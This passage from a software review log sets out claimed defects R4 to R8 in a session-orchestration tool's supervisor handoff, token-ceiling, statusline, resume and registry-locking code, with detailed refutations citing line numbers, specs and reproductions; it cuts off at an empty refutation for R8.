**Claim:** Reproduced: P begins a handoff, successor S1 really boots (`sup-boot --handoff-inc S1 --handoff-token ...`) and writes HANDSHAKE. P runs `fleet sup-release` and exits. A new body runs `fleet sup-boot` -> verdict `fresh`, and `supervisor/HANDSHAKE` still names S1. The new holder then runs its own `fleet sup-handoff-begin`, whose successor S2 goes DOA (roster never shows it). The new holder now has NO fleet verb that can resolve its own handoff: `sup-handoff-abort --successor-inc S2` -> "--successor-inc does not match HANDSHAKE inc <S1> -- refusing to stop an unrelated session"; `sup-handoff-abort --retire-all` -> "supervisor/HANDSHAKE is present (inc=<S1> ...)"; `sup-handoff-complete --expect-inc S2` -> "HANDSHAKE mismatch: found inc=<S1>". Meanwhile `handoff_token_hash` stays on the claim, so `fleet kill supervisor` and `fleet respawn supervisor` also refuse (bin/fleet.py:6109). Nothing printed by any of those refusals names the one command that works (`sup-handoff-abort --successor-inc <S1>`); the only other exit is deleting `supervisor/HANDSHAKE` by hand, which is mentioned solely in a `fleet doctor` row that does not appear until the file is 300 s old.

**Refuted because:**

- *(confidence: high)* I re-read every cited site and ran a four-case repro against `bin/fleet.py` (py -3.13, scratch file at C:\Users\Techn\AppData\Local\Temp\claude\C--proga-claude-fleet\baba481d-cd0e-42f6-bded-78c2a3670c6a\scratchpad\test_hsverify.py, 4 passed).  WHAT IS TRUE: the mechanical observation. `cmd_sup_boot`'s `verdict == "claim"` arm (bin/fleet.py:11764-11781) has no `handshake_path().unlink()`; only the seize/limit-transfer arm does (11808-11813). Repro 1 confirms a `state: "released"` claim + a HANDSHAKE naming S1 boots `VERDICT: claim` with `supervisor/HANDSHAKE` still naming S1. Repro 2 confirms the seize arm clears it.  WHAT IS FALSE — the whole severity claim ("the new holder now has NO fleet verb that can resolve its own handoff", "Nothing printed by any of those refusals names the one command that works"):  (a) The remedy the DOA path itself prints self-heals it. `cmd_sup_handoff_begin`'s DOA return (bin/fleet.py:13987-13991) prints "Claim unchanged -- duty continues; re-run sup-handoff-begin to retry." A retry's successor S3 boots via `sup-boot --handoff-inc S3`; `handoff_boot_refusal` (10979-11024) returns None (S3 has an unsuperseded pending entry) and `write_handshake` at 11705 OVERWRITES the stale HANDSHAKE. Repro 3: `HANDSHAKE AFTER RETRY SUCCESSOR BOOT: {'incarnation_id': 'inc-...-3333', 'session_id': 'sid-s3', ...}`. The succession then completes normally. There is no `hs is not None` guard anywhere in begin or in the successor boot path that would block this.  (b) The abort exit exists AND is named by the refusals. Repro 4 captured the real strings: aiming at S2 prints "--successor-inc does not match HANDSHAKE inc inc-20260101T000000Z-1111"; `--retire-all` prints "supervisor/HANDSHAKE is present (inc=inc-...-1111 sid=sid-s1) -- ... Complete it (`sup-handoff-complete --expect-inc inc-...-1111 --nonce <value>`) or abort it by handle first". That names the verb, the handle and the value. Running `sup-handoff-abort --successor-inc inc-...-1111` then returns rc 0, unlinks HANDSHAKE (14347-14350) and leaves S2's entry intact for a normal retire. `fleet sup-status --json` also publishes the HANDSHAKE inc/sid via `_project_handshake` (13000-13007), so the state is visible without waiting on doctor's 300 s age gate.  CITATION ERRORS: the `location` line 11762 is the `holder_limited=` kwarg of `supervisor_claim_decision`, not the claim arm; "resolve_handoff_abort arm 1 (:11811-11823)" points at the seize arm's own unlink — arm 1 is 10813-10825. The `handoff_token_hash` sub-claim is also muddled: `cmd_sup_release`'s enumerated literal (12918-12923) drops `handoff_token_hash` and the pending set, so the predecessor's token does NOT survive release; any kill/respawn refusal at 6111 comes from the new holder's OWN begin (13779), which is expected behavior mid-handoff, not stale residue.  So the defect as filed — a high-severity wedge with no in-fleet exit — does not exist. The residue is a low-severity hygiene/UX gap: on a fresh claim the orphan HANDSHAKE survives, so the first abort/retire-all/complete aimed at a NEW successor refuses with a message about a stranger incarnation until the operator either retries begin or aborts by the stale inc.
- *(confidence: high)* The mechanical claim is true — bin/fleet.py:11762-11779 (the `verdict == "claim"` arm) mints a new incarnation without the `handshake_path().unlink()` hygiene the seize/limit-transfer arm has at :11806-11811, and the fresh arm is reachable via a released claim (supervisor_claim_decision rule 1, :11476-11504; cmd_sup_release at :12908-12934 neither refuses on nor clears a live HANDSHAKE). But the finding's stated consequence — "the new holder now has NO fleet verb that can resolve its own handoff", filed as high severity — is false, and that is the whole basis of the severity.  I ran the pure decision function with a stale HANDSHAKE naming S1 and a claim whose only pending entry is S2:   S2 handle -> refuse ("--successor-inc does not match HANDSHAKE inc <S1>")   S1 handle -> {'action': 'stop', 'sid': 's-s1', 'inc': '<S1>', 'via': 'handshake', 'entry': None} So `fleet sup-handoff-abort --successor-inc <S1> --nonce <v>` IS a working in-fleet escape. arm 1 (bin/fleet.py:10817-10827) matches, and cmd_sup_handoff_abort tolerates the null entry: `if verdict.get("entry") is not None: drop_handoff_entry(...)` at :14364, after `handshake_path().unlink()` at :14348, and it returns 0 even if `_stop_native_session` fails (:14403-14408). Once HANDSHAKE is gone, `--retire-all` retires S2 normally.  The "nothing names the working command" claim is also wrong for the strongest refusal: `_cmd_sup_handoff_retire_all` (bin/fleet.py:14224-14231) prints `inc=<S1>` and the literal instruction "or abort it by handle first"; the abort refusal prints the HANDSHAKE inc too. That is a message-polish gap, not a wedge.  Two further inaccuracies. (a) `sup-handoff-complete` is token-gated (bin/fleet.py:14085-14095: `expected_hash = claim.get("handoff_token_hash")` compared against the HANDSHAKE's), so the stale file can never transfer the claim — fail-closed. (b) The kill/respawn refusal at :6109 keys on the NEW holder's own `handoff_token_hash`, written by its own `sup-handoff-begin` (:13774) — it fires identically with no stale HANDSHAKE present, so it is not a consequence of this defect.  Reachability also requires two compounded abnormal events (an operator running `sup-release` mid-handoff after a successor already wrote HANDSHAKE — while `sup-status`/doctor are both showing "HANDSHAKE present (handoff in flight)" — plus the next incarnation's successor going DOA before writing its own HANDSHAKE). The happy path self-heals, since `write_handshake` (:10371) overwrites once `handoff_boot_refusal` passes.

---

### R4 — Token-ceiling halves disagree ~500x: Stop hook sums every usage record, fleet sums one per turn

- `bin/hooks/stop_mailbox.py:92`  |  claimed **high**  |  dimension `hooks-statusline`

**Claim:** Operator spawns `fleet spawn w --dir ... --task ... --token-ceiling 500000`. `_write_ceiling_file` (bin/fleet.py:228) writes `500000` to `state/ceilings/<sid>`. After one long session (~435 assistant records) the Stop hook computes 671,691 >= 500,000 and takes the early `return` at line 183: it ALLOWS the stop and deliberately does NOT claim the mailbox. From then on every `fleet send` to that worker lands as mail the Stop hook refuses to deliver — the worker stops instead of continuing on the steer. Meanwhile `cmd_send`'s own gate (bin/fleet.py:4811) computes `_native_cumulative_tokens` ~= a few thousand, never trips, never sets `status="over_ceiling"`, and never appends the `ceiling_exceeded` event. `fleet status` shows a healthy `idle+mail` row with no ceiling flag, and no surface anywhere says why the worker stopped ignoring its mail.

**Refuted because:**

- *(confidence: high)* The finding's arithmetic observation is true but its failure scenario, its documentary evidence, and its severity are all wrong, and the divergence was already filed, adjudicated, and deliberately accepted.  1) THE STATED FAILURE SCENARIO DOES NOT OCCUR. The finding claims "From then on every `fleet send` to that worker lands as mail the Stop hook refuses to deliver — the worker stops instead of continuing on the steer" and that "no surface anywhere says why." Reading the callers refutes this. When the worker is idle, `_cmd_send_native` does NOT use the mailbox channel — it fork-steers, and the fork's prompt is built by `compose_prompt` (bin/fleet.py:1251), which unconditionally claims and drains `mailbox/<sid>.md`:      claim = None     if sid is not None:         mail, claim = claim_mailbox(sid)         if mail:             parts.append(f"<MANAGER MESSAGE>\n{mail}\n")             append_event("mail_drained", name, sid=sid)  Its own docstring names this the "universal-drain guarantee (every compose_prompt call claims the mailbox)" (bin/fleet.py:1255-1256). Every launch path goes through it with the old sid — send fork-steer (:4849), resume-limited (:5003), respawn (:5515) — and `_migrate_residual_mailbox(old_sid, new_sid)` (:4898, called at :9343) even carries mail that raced the sid rotation. So the pending mail is delivered on the very next send/respawn, not stranded "from then on." Nothing is lost.  Meanwhile the state IS surfaced: `idle+mail` is an explicit status flag (bin/fleet.py:2936 and :4180, `flags.append("idle+mail")`), which is exactly what the hook's own comment says it is producing ("it stays visible via idle+mail for the next launch", bin/hooks/stop_mailbox.py:174-176) and what tests/test_hooks.py:678-697 (`test_over_ceiling_allows_stop_with_mail_pending`) pins, asserting the mailbox file survives byte-for-byte.  2) THE CITED DOCSTRING DOES NOT ASSERT WHAT THE FINDING SAYS. `ceilings_dir()` (bin/fleet.py:107-113) says only "Path MUST match bin/hooks/stop_mailbox.py's _ceiling_path ... fleet.py WRITES these on launch; the Stop hook only READS them to decide whether to allow a stop despite pending mail." That is a claim about the FILE PATH and the write/read split, not about the two halves computing the same quantity. `_native_cumulative_tokens` (:1502-1509) makes no agreement claim either — it says "sum ... across every kind=='result' outcome record ... used by cmd_send's fork-steer path". SPEC.md:240 likewise describes the two sources separately. So the "docs assert something the code does not do" hook is absent.  3) ALREADY FILED AND ADJUDICATED AS LOW, WITH A DELIBERATE "DO NOT ALIGN" DISPOSITION. docs/reviews/c2-review-code.md F-3 is this exact finding, verbatim in substance: "They share the input_tokens/output_tokens keys but not the record scope or source ... those are different files with different accounting, so the two counts can diverge materially. No safety break — the hook only ALLOWS, fleet hard-enforces." The binding fix list docs/reviews/C2-FIX-LIST-2026-07-08.md FIX-4 resolved it by rewording the docstring to "different enforcement roles, not identical computation" — i.e. the project explicitly chose to document the divergence rather than make the numbers agree. (Its sibling F-2/FIX-3, the `>` vs `>=` boundary, WAS aligned — fleet.py:4811 is now `used >= token_ceiling` — showing the halves were reviewed together and only the boundary was deemed worth fixing.)  4) THE DIRECTION IS SAFE, AND THE FINDING HAS THE BROKEN HALF BACKWARDS. The hook can only ever ALLOW a stop; it never gains blocking power from the ceiling (stop_mailbox.py:172-178). An early trip therefore stops a worker sooner than the operator's budget — it can never cause an overrun, data loss, or a wedged worker. And the hook's transcript-wide sum is the closer approximation of real cumulative usage; fleet's per-turn-last-record sum is the one that undercounts, so if anything the fleet-side gate is the vacuous half, not the hook.  5) THE FEATURE IS RETIRED BY SIGNED OPERATOR DECISION. docs/OPERATOR-GATES.md:51 (M-F budget envelope, 2026-07-23, Altai): "no fleet-enforced token or USD ceilings for anyone; the plan's own usage limits cap workers and managers alike ... Cost/token counting becomes an on/off flag, default off." docs/PLAN.md:88 marks the ceiling denomination "RETIRED 2026-07-24 — dead law", naming `--token-ceiling` as itself retired by the gate. The code path is still reachable only behind an opt-in flag the operator has decided to delete.  Net: a real but known numeric divergence between two best-effort estimators with different enforcement roles, already dispositioned LOW, in a feature slated for removal — dressed up with a mail-loss scenario that the universal-drain guarantee makes impossible.

---

### R5 — Statusline `N bodies` alarm counts stale supervisor husks, so the reserved red alarm is permanently lit

- `bin/fleet_statusline.py:148`  |  claimed **high**  |  dimension `hooks-statusline`

**Claim:** A fleet that has run more than one supervisor incarnation accumulates `sup|<inc>|<role>` rows. Any body whose session ended without fleet ever re-probing it stays last-committed `idle` forever (16 of 20 rows here did reach `dead`; three did not, and have been `idle` for 20-27 h). From that moment the statusline renders `3 bodies`/`4 bodies` in the bold-red colour reserved exclusively for "two live supervisors over one GOALS.md" — on every refresh, indefinitely. When a genuine second live supervisor actually appears, the alarm is already lit and the operator cannot tell the new incident from the standing false one; the count they were told discriminates incidents ("2 and 9 are different incidents") is dominated by corpses.

**Refuted because:**

- *(confidence: high)* The observable facts in the finding reproduce, but they are the specified behaviour, not a defect.  1) The spec defines "live" exactly as the code does, one bullet ABOVE the alarm bullet the finding quotes. `C:\proga\claude-fleet\docs\specs\terminal-surface.md:171`: "**A live supervisor body is not a worker.** Rows with `tier == \"supervisor\"` and a non-`dead` status leave the worker buckets entirely." Then :172: "**More than one live supervisor body is an alarm**". `_live_supervisor_bodies` (`bin\fleet_statusline.py:148-150`) is a verbatim implementation of :171's definition, and it is the SAME predicate the render already uses at `bin\fleet_statusline.py:186` to pull sup rows out of the buckets. So there is no doc/code divergence and no broken invariant — the finding substitutes its own definition of "live" (probed process liveness) for the spec's.  2) "idle" is not a corpse in fleet's ontology, so the husk premise is wrong. `NATIVE_TERMINAL_STATUSES` (`bin\fleet.py:2752`) makes `idle` terminal — every headless worker's OS process has exited when it is idle; that is what idle means fleet-wide. An idle row is a RESUMABLE session: `_cmd_send_native`'s idle path fork-steers a new session off it (`bin\fleet.py:6140-6152`). An un-retired `sup|…|<role>` row idle for 27 h is therefore precisely a body an operator can wake over the same GOALS.md, which is the hazard §10.4's tombstone choreography exists to close by leaving retired bodies `dead`. Every dead sup row in the live registry (16 of 21) got there through kill/respawn/tombstone; the non-dead ones are the ones that never were retired. The alarm is telling the truth and the action is `fleet kill`/`clean`, which is exactly what the reserved colour is for.  3) The designer measured this exact render and ruled it true: `knowledge\lessons.md:892` — "First live render immediately paid: `sup held 14m  8 bodies  work 1 idle 24  +9 dead` — the eight-body alarm is true, and was invisible before."  4) The finding's own corroborating evidence cuts the other way. `fleet sup-status` reporting one supervisor is not a contradiction: `lessons.md:889-892` states the tier projection exists because the CLAIM (`snap["supervisor"]`) and the BODY (`workers[].tier`) "are different questions and a view that conflates them will report a husk as command." `bin\fleet.py:3118-3123` says the same in-code.  5) Both proposed fixes are worse, and the "better" one is factually broken. Stale-gating on `stale_after` would silence the reserved alarm for two genuinely competing bodies that are both idle >5 min — a view is forbidden from asserting liveness it did not probe (D2), and it is equally forbidden from asserting deadness; D2's sanctioned mitigation is the age suffix, not suppression. The incarnation-matching variant fails on live data: the `<inc>` in a gen-0 body name is a freshly minted LAUNCH id (`bin\fleet.py:13501-13502`, `launch_id = mint_incarnation_id(); name = f"sup|{launch_id}|boot"`), not the claim id the body mints when it boots. I measured it on this repo right now — working body `sup|inc-20260727T235855Z-ee49|boot` under claim `inc-20260727T235933Z-8455`. That fix would render 0 bodies during a real two-body incident.  Reachability lens: the path is not only reachable, it is live (`py -3.13` render on this repo's registry gives `[fleet]  sup held 5m  4 bodies  work 6  idle 39 38m  dead-suspected 1 39m  +19 dead`). But reachable-and-correct is not a defect.

---

### R6 — `resume-limited --force-now` with no worker name force-resumes the entire fleet

- `bin/fleet.py:5160`  |  claimed **high**  |  dimension `limits-time`

**Claim:** Operator has 4 workers parked: 2 past their 5-hour horizon and 2 that hit the wall ten minutes ago with hours left on `limit_reset_at`. Following the habit recorded in lessons.md they run `fleet resume-limited --force-now` (no name) to clear the two null/passed ones. All four are resumed. The two still inside their limit window each burn a full fork-steer dispatch (new sid minted, old sid retired into `retired_sids`, mailbox drained and finalized, ceiling file re-pointed, turn counter incremented), immediately hit the 429 wall again, and re-park — with a re-scanned horizon. The mailbox drain is not idempotent-free: the drained mail rode into a prompt the walled session never processed.

**Refuted because:**

- *(confidence: medium)* The path is reachable — `bin/fleet.py:16128-16130` makes `name` `nargs="?"` and `--force-now` an independent `store_true`, `main` dispatches at `:16411-16412`, and nothing between validates the combination. So the mechanics of the finding are correct. What fails is the claim that this is a defect.  1) The code matches the documented scoping model. The docstring at `bin/fleet.py:5132-5133` states the scoping rule explicitly and separately from the override: "Named worker -> that worker only; no name -> sweep every eligible worker." The SPEC row of record (`docs/SPEC-v2-history.md:187`) uses the identical two-clause structure — scope is set by the NAME, eligibility is overridden by the FLAG. "unless `--force-now` overrides for that named worker" reads as describing the common invocation, not as a restriction that the flag may only appear with a name. The reviewer read one clause and ignored the sentence immediately after it that defines scope.  2) The finding's own strongest evidence refutes it. `knowledge/lessons.md:607` reads: "both live workers hit the plan limit mid-wave, parked `limited`, resumed past midnight via `resume-limited --force-now` with zero loss. Gap found: 'resets 12am (Asia/Qyzylorda)' horizon format unparsed -> null-horizon park needing --force-now." That is the nameless sweep used deliberately in production, on two null-horizon parks the scanner couldn't read, recorded as a clean success. The proposed fix (`raise FleetCliError("--force-now requires a worker name")`) would break that exact operator workflow — the null-horizon park is the common case precisely because local-time horizons often don't parse, so sweeping them all with one force is the flag's primary purpose.  3) The claimed harm is not specific to the nameless form. Force-resuming a worker that still has hours on `limit_reset_at` burns a fork-steer, drains the mailbox into a prompt, and re-parks — identically whether one name was passed or none. That named case is explicitly implemented, is what the help text advertises ("even before its horizon"), and is pinned green by `tests/test_resilience.py:1349 test_before_horizon_relaunched_with_force_now`. So the described damage is the flag's accepted, tested cost that the operator opts into by typing an override, not a bug in the nameless branch.  4) Nothing is silent or irrecoverable. Every worker is reported per-line (`:5177-5180` prints `resumed`/`skipped -- <why>`), the default with no flag is the safe gated sweep, and on dispatch failure `_resume_one_limited_native` restores the mailbox claim and rolls the record back to `limited` (`bin/fleet.py:5013-5021`). `grep -n force_now bin/fleet.py` shows the flag is set at exactly one place — the argparse parser; no internal caller (autoclean, tier beat, doctor) ever passes `force_now=True`, so there is no path where the fleet-wide force fires without an operator typing it.  What survives is a phrasing mismatch, not wrong behavior: the argparse help at `:16130` ("resume a named worker even before its horizon") and `commands/resume-limited.md` ("unless `--force-now` names them") describe the flag as if it were name-scoped. That is a docs edit, not a code restriction — and restricting the code as proposed would regress a production-proven workflow. Under the "real defects only, concrete wrong outcome" bar this does not qualify.
- *(confidence: medium)* The reviewer read the control flow correctly — I reproduced it. With two `limited` workers (`a` horizon 2099, `b` null horizon), `fleet.build_parser().parse_args(["resume-limited","--force-now"])` -> `cmd_resume_limited` calls `_resume_one_limited_native` for BOTH (`CALLS ['a','b']`, rc 0). `force_now` is read once at bin/fleet.py:5140, outside the per-name loop, and gates the skip at :5162. That part is real.  What is NOT real is that this is a defect.  1) The spec of record documents exactly this behavior. docs/SPEC-v2-history.md:187 (the `resume-limited` row, carried into the docstring at bin/fleet.py:5132-5133 verbatim) reads: "...unless `--force-now` overrides for that named worker. **Named worker -> that worker only; no name -> sweep every eligible worker.**" That second sentence is the scoping rule, and it is the sentence the code implements: `--force-now` redefines *eligibility*; the name (or its absence) defines the *target set*. The reviewer quotes only the first clause and drops the sentence that immediately disambiguates it. There is no surface anywhere in the repo that says "--force-now requires a name".  2) The proposed fix would break the production-proven workflow the reviewer cites as evidence. knowledge/lessons.md:607 and supervisor/JOURNAL.md:100 record "**Both** workers rode a plan-limit park through midnight reset via `resume-limited --force-now`... with zero loss" — two null-horizon parks cleared by one nameless sweep. Raising `FleetCliError("--force-now requires a worker name")` regresses the only battle-proven UL-continuity recovery path into an N-invocation chore. The reviewer's own evidence refutes the fix.  3) The concrete harm in the failure scenario is asserted, not shown, and self-heals. A forced worker that re-hits 429 is re-parked by the ordinary errored-turn path (`_limit_scan_hook`/`transcript_limit_scan`, bin/fleet.py:2620/2750) with a freshly scanned horizon — no sticky corruption, no lost worker. The "mailbox drain is not idempotent-free / mail rode into a prompt the walled session never processed" claim cites no code: `_resume_one_limited_native` forks with `dispatch_bg(..., resume_sid=old_sid)` (fleet.py:5007-5011) so the drained mail lives in the transcript the *next* resume inherits, and any dispatch failure calls `restore_mailbox_claim(claim)` (fleet.py:5014, helper at :1207 — it even prepends behind newer mail). Crucially, this identical drain/re-park cost is incurred by `resume-limited <name> --force-now` on a worker before its horizon — which `test_before_horizon_relaunched_with_force_now` (tests/test_resilience.py:1349) pins as *intended*. A cost that is intended for one worker cannot be the defect when the operator opts into it for N.  4) Sourcing errors weaken the report: the argparse help is at bin/fleet.py:16129-16130, not 14819. And the pasted repro is presented as a live `$ fleet resume-limited --force-now` run against a temp FLEET_HOME — that would have to clear `_supervisor_gate` (:5138), `_require_instance_settings` (:5139), and actually spawn `claude` processes for `a` and `b`; the output shown is what the *stubbed* path prints, so it is not the receipt it claims to be.  5) "No test covers the nameless form" is a missing-test observation, explicitly out of scope for this review, not a wrong-behavior finding.  Residue: one genuine but trivial wording mismatch — the argparse help string at bin/fleet.py:16130 ("resume a named worker even before its horizon / with an unknown horizon") and commands/resume-limited.md:13 ("unless `--force-now` names them") both read as if the flag were name-scoped, while the spec sentence they abbreviate is not. That is a help-text nit, not a high-severity behavior defect, and the correct edit is to the help string, not to the code.

---

### R7 — RegistryCorruptError escapes _commit_launched_turn, stranding an already-dispatched live session

- `bin/fleet.py:3373`  |  claimed **high**  |  dimension `locking`

**Claim:** Worker `w1` is idle. `fleet send w1 "..."` pre-claims under the lock, releases it, and `dispatch_bg` successfully forks a real billable `claude --bg` session (new sid `S2`). At the post-dispatch commit, `_commit()`'s `load_registry()` opens `state/fleet.json` at the instant a concurrent `fleet status` finishes `save_registry`'s `os.replace` (Windows delete-pending / AV-scan sharing violation) -> `PermissionError` -> `RegistryCorruptError`. The exception escapes `_commit_launched_turn` and `cmd_send` entirely. Outcome: (a) session `S2` is live, billing, and its sid/short_id are printed nowhere -- `_report_stranded_native_turn`, the only code that emits them, was bypassed; (b) the registry still says `w1` is `working` under `old_sid`, so `recompute_worker_native` will later demote it to `dead-suspected`; (c) the operator sees what reads as a failed command and re-runs `fleet send w1`, producing a SECOND live fork on the same worker -- the exact double-dispatch the helper's docstring says it exists to prevent.

**Refuted because:**

- *(confidence: high)* The mechanism the finding describes is real as a code reading — `RegistryCorruptError` (bin/fleet.py:623, `class RegistryCorruptError(Exception)`) is not an `OSError`, and `load_registry`'s `except OSError: raise RegistryCorruptError(f"registry unreadable: {path}")` (:754-755) would sail past `_commit_launched_turn`'s `except (FleetLockTimeout, OSError)` (:3375). But under the reachability lens both the trigger and the harm collapse.  (1) THE NAMED RACE IS EXCLUDED BY MUTUAL EXCLUSION, NOT BY LUCK. The finding's scenario is "`_commit()`'s `load_registry()` opens `state/fleet.json` at the instant a concurrent `fleet status` finishes `save_registry`'s `os.replace`". Every one of the five `commit_fn` bodies opens with `with fleet_lock(): data = load_registry()` — :3963-3965 (`_commit_native_stamp`), :4882-4884 (`_cmd_send_native._commit`), :5577-5580 (`_cmd_respawn_native._commit`), :13577-13579, and the resume-limited path — so the read the finding targets is performed while holding `fleet_lock`, a real cross-process O_CREAT|O_EXCL mutex (:496-556). The counterparty it names writes under the SAME lock: `cmd_status`'s merge is `with fleet_lock(): data = load_registry() ... save_registry(data)` at :4104-4105 (its lock-free work is the pre-probe `read_registry_no_repair()` at :4064 and the recompute, neither of which touches the file for writing). The only other renamer of `state/fleet.json` is `_quarantine_registry`, reachable from exactly two sites (:752, :758) inside `load_registry`, and after the 2026-07-27 gate the sole verb that reaches it is `fleet doctor --repair`, which also does it `with fleet_lock():` (:9083-9084). So no fleet process can have an `os.replace`/rename in flight against fleet.json while a `commit_fn` has it open. What is left as a trigger is an out-of-band fault (an AV scanner grabbing the file, EMFILE, a disk read error) — i.e. exactly the speculative "could happen if" the brief excludes, and materially different from the transient sharing violation the repo has actually observed, which is on the WRITE side (`_replace_with_retry`, :814-831: "`os.replace` onto a path another process has open fails with WinError 5/32") and is an `OSError` the handler already catches.  (2) THE HEADLINE HARM — "the operator re-runs `fleet send w1`, producing a SECOND live fork" — IS BLOCKED UPSTREAM IN BOTH DISPATCHING VERBS. For send: the pre-claim at :4837-4841 has already written `status="working"`, `last_dispatch_at=now`, `session_id=old_sid` before dispatch. A re-run therefore hits the raw-in-flight guard at :4713-4735 — `rec.get("status") == "working"`, `has_fresh_outcome(name, raw_sid, last_dispatch_at)` is False (the old session's outcome predates the pre-claim) and `_launch_claim_expired` is False — which does `append_mailbox(raw_sid, message)`, prints "turn running -- message queued to mailbox" and returns 0. No dispatch. If recompute instead agrees on "working", the :4768-4792 branch queues mail identically. Once the claim expires, recompute yields dead-suspected and :4747-4753 refuses outright. For spawn: the pre-claim record already exists, so a re-run dies at `validate_name(args.name, existing=data["workers"].keys())` (:3856) → "worker name already exists" (:619-620). Neither verb can be made to double-fork by re-running it.  What genuinely remains, granting an out-of-band OSError, is a diagnostics gap, not data loss or a double-dispatch: the operator sees `fleet: registry error: registry unreadable: ...` (main's arm at :16449-16450) instead of the `_report_stranded_native_turn` text, and fleet's own records do not carry the new sid (`dispatch_bg` only appends events on the failure branches). The session is still recoverable via `claude agents` — which is what `_report_stranded_native_turn` itself tells the operator to use (:3411-3412) — and the record self-heals via `LAUNCH_CLAIM_MAX_AGE_SECONDS`. That is a low-severity message-quality issue on an unreachable-in-practice branch, not the HIGH the finding claims.  Side note on the proposed fix's second half: the `read_registry_no_repair` (:801-802) concern is a different code path from the filed location, and the one place it could plausibly overlap a writer (`cmd_status`'s lock-free pre-probe read at :4064) yields only a wrong error message and exit 1 on a view — no state is harmed, and views never quarantine by construction.
- *(confidence: medium)* The reviewer's *control-flow* reading is literally correct — `RegistryCorruptError(Exception)` (bin/fleet.py:623) is not an `OSError` (confirmed by running `issubclass(fleet.RegistryCorruptError, OSError)` -> False), `load_registry` re-classes read-side `OSError` at :754-755, and `_commit_launched_turn`'s handler at :3375 catches only `(FleetLockTimeout, OSError)`. But every load-bearing part of the *failure scenario* — the trigger, and both harmful outcomes — is wrong, so the finding does not stand as a HIGH defect.  (1) THE TRIGGER IS UNREACHABLE AS DESCRIBED, AND INVERTS THE WINDOWS BEHAVIOUR IT CITES. The scenario needs a concurrent `fleet status` to be inside `save_registry`'s `os.replace` while the commit's `load_registry` opens the file. That cannot overlap: every registry write in the process is lock-serialized — `cmd_status` explicitly re-acquires `with fleet_lock(): data = load_registry() ... save_registry(data)` at bin/fleet.py:4104-4131 — and the commit_fn's read is itself *inside* `with fleet_lock():` (`_cmd_send_native._commit`, :4883-4884; `_commit_native_stamp`, :3964-3965). I audited all 44 `save_registry(` call sites: the only ones not within 120 lines of a `fleet_lock` are :4796/:4814/:4841, all inside `_cmd_send_native`'s single outer lock block. Hooks are read-only by declared invariant 6 (bin/hooks/stop_outcome.py:126, bin/hooks/postcompact_journal.py:16). Worse, the platform note in `_replace_with_retry` (:816-820) records the OBSERVED direction of the win32 conflict as the opposite one: *"`os.replace` onto a path another process has open fails with WinError 5/32"* — i.e. a concurrent open makes the REPLACE fail (already an `OSError`, already retried), not the reader. No evidence is offered that a read-side sharing violation on fleet.json has ever occurred.  (2) THE HEADLINE CONSEQUENCE — DOUBLE-DISPATCH — IS REFUTED BY THE CODE. After a stranded fork-steer the record is status="working", session_id=old_sid, last_dispatch_at=<just stamped> (:4837-4841). Re-running `fleet send w1` hits the raw-working pre-check at :4713-4735: raw_sid is not None, `has_fresh_outcome(name, old_sid, last_dispatch_at)` is False (the anchor was just advanced) and `_launch_claim_expired` is False (LAUNCH_CLAIM_MAX_AGE_SECONDS = 600.0, :1142), so `in_flight` is True -> `append_mailbox` + "turn running -- message queued to mailbox" + return 0. Even if recompute returned "working", the :4768 branch also queues mail. Past 600s it falls through to the dead-suspected refusal (:4747-4753). Under NO branch does a re-run fork a second live session. The `fleet spawn` variant is likewise blocked by the name-uniqueness refusal in `validate_worker_name` (:619-620). So "the exact double-dispatch the helper's docstring says it exists to prevent" does not occur.  (3) THE REGISTRY-STATE CONSEQUENCE IS NOT A DELTA. On the *handled* path (`_commit_launched_turn` returns False), `_report_stranded_native_turn` deliberately does not mutate anything either — the record is left in exactly the same status="working"/old_sid state and auto-demotes after LAUNCH_CLAIM_MAX_AGE_SECONDS, which its own message says verbatim (:3405-3409). So consequence (b) is identical in the escape path and the blessed path; it is not caused by the escape.  (4) THE RESIDUAL DELTA IS DIAGNOSTIC ONLY, AND THE HANDLE IS NOT LOST. What actually differs is the stderr text ("fleet: registry error: registry unreadable: ..." at :16449-16451, rc 1 — note the reviewer cited :15114, which is not that line) and a missing best-effort `turn_commit_failed` event. The live session is still recoverable exactly the way `_report_stranded_native_turn` itself tells operators to recover it — via `claude agents` (:3411-3412) — and it carries the worker name in its rendered `-n` value (`render_native_name`, :9693-9694).  (5) THE PROPOSED FIX IS ITSELF A REGRESSION RISK. Making `load_registry`/`read_registry_no_repair` re-raise raw `OSError` would push a brand-new exception class out of a loader whose ~50 callers and `main()`'s handler arm (:16449) are written around `RegistryCorruptError`; an unreadable registry would then hit main's final `except (FleetCliError, ..., UnsupportedPlatformError)` arm not at all and traceback out.  Because the stated trigger cannot occur under the module's lock discipline, and because both harmful outcomes are prevented by existing guards, I refute this as filed.

---

### R8 — finalize_mailbox_claim swallows only FileNotFoundError; any other OSError rolls back a launch that succeeded

- `bin/fleet.py:1195`  |  claimed **high**  |  dimension `mailbox`

**Claim:** `fleet send alpha "do X"` on an idle native worker takes the fork-steer path. `append_mailbox(old_sid, "do X")` (:4844) writes the message, `compose_prompt` claims it to `mailbox/<old_sid>.md.claimed.<pid>`, and `dispatch_bg` (:4849) SUCCEEDS — a new live session `new_sid` is already running with "do X" in its prompt. An AV/search-indexer holds the freshly renamed claim file open for ~50ms, so `claim.unlink()` at :1200 raises `PermissionError`. That escapes `finalize_mailbox_claim` into `except BaseException:` at :4855, which (a) calls `restore_mailbox_claim` — recreating `mailbox/<old_sid>.md` containing "do X", which was ALREADY delivered, so it will be re-delivered on the next steer, and (b) rolls the registry record back to `status="idle"`/`session_id=old_sid` (:4860-4864) even though `new_sid` is live, then re-raises so the CLI reports failure. The operator retries `fleet send`, producing a SECOND live session under the name `alpha` and a third copy of the message. The respawn variant is worse: :5564-5571 restores the whole pre-respawn snapshot `before`, so the registry claims the old (already `claude stop`ped) session is current while the brand-new session runs unowned — a direct violation of the "never two live sessions under one name" invariant asserted at :5484-5487.

**Refuted because:**

